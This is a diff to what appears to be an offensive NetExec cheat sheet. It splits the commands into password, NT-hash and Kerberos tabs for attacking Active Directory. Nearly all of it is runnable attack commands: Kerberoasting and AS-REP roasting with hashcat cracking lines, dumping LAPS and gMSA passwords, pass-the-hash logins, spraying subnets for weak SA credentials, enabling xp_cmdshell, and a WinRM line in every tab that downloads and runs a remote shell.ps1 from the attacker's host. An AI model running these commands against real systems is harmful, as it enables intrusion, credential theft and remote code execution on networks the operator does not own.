+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "sAMAccountName,description,memberOf"
 
-# Accounts with SPN set (Kerberoastable)
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(&(sAMAccountType=805306368)(servicePrincipalName=*))" "sAMAccountName,servicePrincipalName"
+    # Accounts with SPN set (Kerberoastable)
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(&(sAMAccountType=805306368)(servicePrincipalName=*))" "sAMAccountName,servicePrincipalName"
 
-# Accounts with pre-auth disabled (AS-REP roastable)
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
+    # Accounts with pre-auth disabled (AS-REP roastable)
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
 
-# Accounts with PASSWD_NOTREQD
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName"
+    # Accounts with PASSWD_NOTREQD
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName"
 
-# Computers with unconstrained delegation (excluding DCs)
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" "name,dNSHostName"
+    # Computers with unconstrained delegation (excluding DCs)
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" "name,dNSHostName"
 
-# Find dMSA objects (Windows Server 2025 BadSuccessor)
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(objectClass=msDS-DelegatedManagedServiceAccount)" "name,msDS-ManagedAccountPrecededByLink"
-```
+    # Find dMSA objects (Windows Server 2025 BadSuccessor)
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(objectClass=msDS-DelegatedManagedServiceAccount)" "name,msDS-ManagedAccountPrecededByLink"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Full attribute dump for matching objects
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "*"
+
+    # Selected attributes only
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "sAMAccountName,description,memberOf"
+
+    # Accounts with SPN set (Kerberoastable)
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(&(sAMAccountType=805306368)(servicePrincipalName=*))" "sAMAccountName,servicePrincipalName"
+
+    # Accounts with pre-auth disabled (AS-REP roastable)
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
+
+    # Accounts with PASSWD_NOTREQD
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName"
+
+    # Computers with unconstrained delegation (excluding DCs)
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" "name,dNSHostName"
+
+    # Find dMSA objects (Windows Server 2025 BadSuccessor)
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --query "(objectClass=msDS-DelegatedManagedServiceAccount)" "name,msDS-ManagedAccountPrecededByLink"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Full attribute dump for matching objects
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "*"
+
+    # Selected attributes only
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "sAMAccountName,description,memberOf"
+
+    # Accounts with SPN set (Kerberoastable)
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(&(sAMAccountType=805306368)(servicePrincipalName=*))" "sAMAccountName,servicePrincipalName"
+
+    # Accounts with pre-auth disabled (AS-REP roastable)
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
+
+    # Accounts with PASSWD_NOTREQD
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName"
+
+    # Computers with unconstrained delegation (excluding DCs)
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" "name,dNSHostName"
+
+    # Find dMSA objects (Windows Server 2025 BadSuccessor)
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --query "(objectClass=msDS-DelegatedManagedServiceAccount)" "name,msDS-ManagedAccountPrecededByLink"
+    ```
+  </Tab>
+</Tabs>
 
 ### Group Membership
 
 Check which groups a specific user belongs to: useful for understanding what access a compromised account has.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o USER=$TARGET      # list groups for user
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o GROUP="Domain Admins" # list members of group
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o USER=$TARGET      # list groups for user
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M groupmembership -o GROUP="Domain Admins" # list members of group
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M groupmembership -o USER=$TARGET      # list groups for user
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M groupmembership -o GROUP="Domain Admins" # list members of group
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M groupmembership -o USER=$TARGET      # list groups for user
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M groupmembership -o GROUP="Domain Admins" # list members of group
+    ```
+  </Tab>
+</Tabs>
 
 ### BloodHound Collection
 
 Collect all AD relationship data in BloodHound format: import the zip into BloodHound CE for graph analysis. The `-d` and `--dns-server` flags are required for name resolution; without them computer object resolution fails and the graph will be missing edges.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c all       # collect all BloodHound data
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c DCOnly    # DC-only collection (faster, less noise)
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all           # module alternative
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all,LoggedOn  # include logged-on users
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c all       # collect all BloodHound data
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --bloodhound -c DCOnly    # DC-only collection (faster, less noise)
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all           # module alternative
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all,LoggedOn  # include logged-on users
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --bloodhound -c all       # collect all BloodHound data
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --bloodhound -c DCOnly    # DC-only collection (faster, less noise)
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all           # module alternative
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all,LoggedOn  # include logged-on users
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --bloodhound -c all       # collect all BloodHound data
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --bloodhound -c DCOnly    # DC-only collection (faster, less noise)
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all           # module alternative
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M bloodhound -o COLLECTION=all,LoggedOn  # include logged-on users
+    ```
+  </Tab>
+</Tabs>
 
 ### Kerberoasting
 
 Request TGS tickets for all SPN-registered accounts: output is in hashcat format ready for offline cracking.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt     # request all kerberoastable TGS hashes
-nxc ldap $DC_IP -u $USER -H $HASH -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt # PTH version
-# Crack: hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt     # request all kerberoastable TGS hashes
+    # Crack: hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt # PTH version
+    # Crack: hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt     # request all kerberoastable TGS hashes
+    # Crack: hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+</Tabs>
 
 ### AS-REP Roasting
 
 Request AS-REP for accounts with pre-authentication disabled: works without credentials if you have a username list.
 
 ```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt     # authenticated, auto-discovers targets
 nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt               # unauthenticated (null session)
 nxc ldap $DC_IP -u users.txt -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt        # test specific user list
 # Crack: hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
 ```
 
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt     # authenticated, auto-discovers targets
+    # Crack: hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt     # authenticated, auto-discovers targets
+    # Crack: hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt     # authenticated, auto-discovers targets
+    # Crack: hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
+    ```
+  </Tab>
+</Tabs>
+
 ### LAPS Passwords
 
 Retrieve LAPS-managed local admin passwords: the `ms-Mcs-AdmPwd` attribute is readable by accounts explicitly granted access.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps                 # dump all LAPS passwords you can read
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M laps                # module variant
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps --computer DC01 # LAPS for specific computer
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps                 # dump all LAPS passwords you can read
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M laps                # module variant
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --laps --computer DC01 # LAPS for specific computer
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --laps                 # dump all LAPS passwords you can read
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M laps                # module variant
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --laps --computer DC01 # LAPS for specific computer
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --laps                 # dump all LAPS passwords you can read
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M laps                # module variant
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --laps --computer DC01 # LAPS for specific computer
+    ```
+  </Tab>
+</Tabs>
 
 ### gMSA Passwords
 
 Retrieve Group Managed Service Account passwords: requires membership in the account's `PrincipalsAllowedToRetrieveManagedPassword` group.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M gmsa                # retrieve all readable gMSA passwords
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M gmsa                # retrieve all readable gMSA passwords
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M gmsa                # retrieve all readable gMSA passwords
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M gmsa                # retrieve all readable gMSA passwords
+    ```
+  </Tab>
+</Tabs>
 
 ### LDAP Security Checks
 
 Check whether the DC enforces LDAP signing and channel binding: if not enforced, LDAP relay attacks are possible.
 
 ```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M ldap-checker        # check signing + channel binding enforcement
 nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP -M ldap-checker                  # also test without credentials
 ```
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M ldap-checker        # check signing + channel binding enforcement
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M ldap-checker        # check signing + channel binding enforcement
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M ldap-checker        # check signing + channel binding enforcement
+    ```
+  </Tab>
+</Tabs>
 
 ### Machine Account Quota
 
 Check how many machine accounts unprivileged users can create: if above 0, RBCD and other attacks requiring a computer account become trivial.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M maq                 # read ms-DS-MachineAccountQuota
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M maq                 # read ms-DS-MachineAccountQuota
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M maq                 # read ms-DS-MachineAccountQuota
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M maq                 # read ms-DS-MachineAccountQuota
+    ```
+  </Tab>
+</Tabs>
 
 ## WinRM
 
@@ -354,11 +823,29 @@ nxc winrm $IP -u $USER -p $PASSWORD --ssl                   # HTTPS (port 5986)
 
 `-x` runs a raw command, `-X` runs PowerShell: both return output inline.
 
-```bash wrap
-nxc winrm $IP -u $USER -p $PASSWORD -x 'whoami /all'        # cmd.exe command
-nxc winrm $IP -u $USER -p $PASSWORD -X 'Get-Process | Select-Object Name,Id'  # PowerShell command
-nxc winrm $IP -u $USER -p $PASSWORD -X "IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")"
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc winrm $IP -u $USER -p $PASSWORD -x 'whoami /all'        # cmd.exe command
+    nxc winrm $IP -u $USER -p $PASSWORD -X 'Get-Process | Select-Object Name,Id'  # PowerShell command
+    nxc winrm $IP -u $USER -p $PASSWORD -X "IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc winrm $IP -u $USER -H $NTHASH -x 'whoami /all'        # cmd.exe command
+    nxc winrm $IP -u $USER -H $NTHASH -X 'Get-Process | Select-Object Name,Id'  # PowerShell command
+    nxc winrm $IP -u $USER -H $NTHASH -X "IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc winrm $IP -u $USER --use-kcache -x 'whoami /all'        # cmd.exe command
+    nxc winrm $IP -u $USER --use-kcache -X 'Get-Process | Select-Object Name,Id'  # PowerShell command
+    nxc winrm $IP -u $USER --use-kcache -X "IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/shell.ps1\")"
+    ```
+  </Tab>
+</Tabs>
 
 ## MSSQL
 
@@ -368,40 +855,103 @@ MSSQL (default port 1433) is worth checking for weak auth and code execution via
 
 Try Windows auth with `-windows-auth` before SQL auth: service accounts and domain users often have SQL access via their domain credentials.
 
-```bash wrap
-nxc mssql $IP -u $USER -p $PASSWORD                               # SQL auth
-nxc mssql $IP -u $USER -p $PASSWORD -windows-auth                 # Windows/Kerberos auth
-nxc mssql $IP -u $USER -H $HASH -windows-auth                     # PTH with Windows auth
-nxc mssql $IP -u sa -p '' -windows-auth                           # blank sa password check
-nxc mssql $SUBNET -u sa -p sa                                     # spray subnet for weak SA creds
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc mssql $IP -u $USER -p $PASSWORD                               # SQL auth
+    nxc mssql $IP -u $USER -p $PASSWORD -windows-auth                 # Windows auth
+    nxc mssql $IP -u sa -p '' -windows-auth                           # blank sa password check
+    nxc mssql $SUBNET -u sa -p sa                                     # spray subnet for weak SA creds
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth                     # PTH with Windows auth
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc mssql $IP -u $USER --use-kcache -windows-auth                    # Kerberos auth via Windows auth
+    ```
+  </Tab>
+</Tabs>
 
 ### Query Execution
 
 Run arbitrary T-SQL queries: useful for enumerating linked servers, database contents, and permissions.
 
-```bash wrap
-nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT @@version"                                              # server version
-nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master.dbo.sysdatabases"                     # list databases
-nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master..syslogins"                           # list SQL logins
-nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT * FROM openquery([$LINKED_SERVER], 'SELECT @@version')"  # linked server query
-nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_linkedservers"                                        # enumerate linked servers
-nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT IS_SRVROLEMEMBER('sysadmin')"                          # check sysadmin
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT @@version"                                              # server version
+    nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master.dbo.sysdatabases"                     # list databases
+    nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT name FROM master..syslogins"                           # list SQL logins
+    nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT * FROM openquery([$LINKED_SERVER], 'SELECT @@version')"  # linked server query
+    nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_linkedservers"                                        # enumerate linked servers
+    nxc mssql $IP -u $USER -p $PASSWORD -q "SELECT IS_SRVROLEMEMBER('sysadmin')"                          # check sysadmin
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "SELECT @@version"                                              # server version
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "SELECT name FROM master.dbo.sysdatabases"                     # list databases
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "SELECT name FROM master..syslogins"                           # list SQL logins
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "SELECT * FROM openquery([$LINKED_SERVER], 'SELECT @@version')"  # linked server query
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "EXEC sp_linkedservers"                                        # enumerate linked servers
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin')"                          # check sysadmin
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "SELECT @@version"                                              # server version
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "SELECT name FROM master.dbo.sysdatabases"                     # list databases
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "SELECT name FROM master..syslogins"                           # list SQL logins
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "SELECT * FROM openquery([$LINKED_SERVER], 'SELECT @@version')"  # linked server query
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "EXEC sp_linkedservers"                                        # enumerate linked servers
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin')"                          # check sysadmin
+    ```
+  </Tab>
+</Tabs>
 
 ### xp_cmdshell
 
 Enable and abuse `xp_cmdshell` for OS command execution: requires `sysadmin` or equivalent rights.
 
-```bash wrap
-nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami'                   # auto-enables xp_cmdshell, runs cmd, disables after
-nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami' --no-output       # suppress output (for blind execution)
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami'                   # auto-enables xp_cmdshell, runs cmd, disables after
+    nxc mssql $IP -u $USER -p $PASSWORD -x 'whoami' --no-output       # suppress output (for blind execution)
 
-# Manual xp_cmdshell enablement via query
-nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE"
-nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
-nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC xp_cmdshell 'whoami'"
-```
+    # Manual xp_cmdshell enablement via query
+    nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE"
+    nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
+    nxc mssql $IP -u $USER -p $PASSWORD -q "EXEC xp_cmdshell 'whoami'"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -x 'whoami'                   # auto-enables xp_cmdshell, runs cmd, disables after
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -x 'whoami' --no-output       # suppress output (for blind execution)
+
+    # Manual xp_cmdshell enablement via query
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE"
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
+    nxc mssql $IP -u $USER -H $NTHASH -windows-auth -q "EXEC xp_cmdshell 'whoami'"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -x 'whoami'                   # auto-enables xp_cmdshell, runs cmd, disables after
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -x 'whoami' --no-output       # suppress output (for blind execution)
+
+    # Manual xp_cmdshell enablement via query
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE"
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
+    nxc mssql $IP -u $USER --use-kcache -windows-auth -q "EXEC xp_cmdshell 'whoami'"
+    ```
+  </Tab>
+</Tabs>
 
 ## SSH
 
@@ -409,15 +959,25 @@ SSH is less common in Windows AD environments but frequently found in Linux targ
 
 ### Authentication and Execution
 
-Test credentials and run commands: supports password auth, key auth, and Kerberos where configured.
+Test credentials and run commands: supports password auth and key auth.
 
-```bash wrap
-nxc ssh $IP -u $USER -p $PASSWORD                            # password auth
-nxc ssh $IP -u $USER --key-file ~/.ssh/id_rsa                # private key auth
-nxc ssh $IP -u $USER -p $PASSWORD -x 'id; hostname'         # command execution
-nxc ssh $IP -u $USER -p $PASSWORD -x 'sudo -l'              # check sudo rights
-nxc ssh $SUBNET -u root -p $PASSWORD -x 'id'                # sweep subnet
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ssh $IP -u $USER -p $PASSWORD                            # password auth
+    nxc ssh $IP -u $USER -p $PASSWORD -x 'id; hostname'         # command execution
+    nxc ssh $IP -u $USER -p $PASSWORD -x 'sudo -l'              # check sudo rights
+    nxc ssh $SUBNET -u root -p $PASSWORD -x 'id'                # sweep subnet
+    ```
+  </Tab>
+  <Tab title="Key File">
+    ```bash wrap
+    nxc ssh $IP -u $USER --key-file ~/.ssh/id_rsa                # private key auth
+    nxc ssh $IP -u $USER --key-file ~/.ssh/id_rsa -x 'id; hostname'  # command execution with key
+    nxc ssh $IP -u $USER --key-file ~/.ssh/id_rsa -x 'sudo -l'  # check sudo rights with key
+    ```
+  </Tab>
+</Tabs>
 
 ## Password Spraying
 
